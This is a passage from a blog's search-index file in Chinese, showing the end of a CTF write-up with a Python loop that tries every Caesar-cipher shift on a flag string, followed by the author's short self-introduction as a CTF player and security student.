class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">    decrypted_text = caesar_decrypt(ciphertext, shift)</span><br><span class="line">    <span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大家好啊我叫ivory</title>
      <link href="/2025/03/07/introduce/"/>
      <url>/2025/03/07/introduce/</url>
      
        <content type="html"><![CDATA[<h4 id="主业是打ctf，学习网安知识"><a href="#主业是打ctf，学习网安知识" class="headerlink" title="主业是打ctf，学习网安知识:"></a>主业是打ctf，学习网安知识:</h4><p><img src="/2025/03/07/introduce/ctf.png"></p><p>有人问我：“你是ctfer吗”<br>我觉得我是</p><h4 id="副业偶尔搞搞各种各样的开发"><a href="#副业偶尔搞搞各种各样的开发" class="headerlink" title="副业偶尔搞搞各种各样的开发"></a>副业偶尔搞搞各种各样的开发</h4><p>例如qqbot:</p><p><img src="/2025/03/07/introduce/qqbot.png"></p><h4 id="目前属于Syclover安全技术小组的新芽组"><a href="#目前属于Syclover安全技术小组的新芽组" class="headerlink" title="目前属于Syclover安全技术小组的新芽组"></a>目前属于<code>Syclover</code>安全技术小组的新芽组</h4><p>希望能继续跟大家一起学习进步</p><p><img src="/2025/03/07/introduce/syc.JPEG"></p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 介绍 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
